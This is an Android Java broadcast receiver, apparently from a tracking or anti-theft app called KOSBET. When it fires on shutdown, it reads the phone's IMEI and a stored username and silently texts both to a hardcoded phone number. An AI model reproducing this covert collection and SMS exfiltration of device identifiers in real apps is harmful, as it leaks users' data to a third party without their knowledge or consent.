package com.kosbet;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class ShutdownReceiver extends BroadcastReceiver 
{
	public static final String PREFS_NAME = "USER";
	private static final String USERNAME = "username";
	String iemi;
	TelephonyManager TM;
	@Override
	public void onReceive(Context context, Intent intent) {
		TM = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		iemi = TM.getDeviceId();
		SharedPreferences settings = context.getSharedPreferences(PREFS_NAME, 0);
		String name1 = settings.getString(USERNAME, null);
		SmsManager sms1 = SmsManager.getDefault();
		//9176903430
		sms1.sendTextMessage("9176903430", null, name1+" is closed KOSBET The IMEI number is "+iemi, null, null);
	}

}
